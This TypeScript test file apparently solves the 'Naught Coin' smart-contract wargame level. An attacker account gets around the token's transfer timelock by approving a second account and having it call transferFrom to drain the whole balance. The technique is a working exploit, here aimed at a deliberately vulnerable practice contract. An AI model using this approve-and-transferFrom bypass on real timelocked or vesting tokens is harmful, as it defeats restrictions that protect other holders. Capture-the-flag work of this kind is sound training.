
import { accounts, contract } from '@openzeppelin/test-environment';
import assert = require('assert');

// Addresses
const [
    owner, // Contract owner
    attacker, // Attacker
    uncle, // Destination of the tokens
] = accounts;

// Loads contracts
const NaughtCoin = contract.fromArtifact('NaughtCoin');
//const GatekeeperTwoAttack = contract.fromArtifact('GatekeeperTwoAttack');
let naughtCoin: any;
//let gatekeeperTwoAttack: any;

beforeEach(async () => {
    naughtCoin = await NaughtCoin.new(attacker, { from: owner });
});

it('Naught Coin -> getting the token balance to 0', async () => {
    const balanceBefore = await naughtCoin.balanceOf(attacker);

    await naughtCoin.approve(uncle, balanceBefore, { from: attacker });

    await naughtCoin.transferFrom(attacker, uncle, balanceBefore, { from: uncle });

    const balanceAfter = await naughtCoin.balanceOf(attacker);

    assert(balanceAfter.toString() === '0', 'balance after');
});
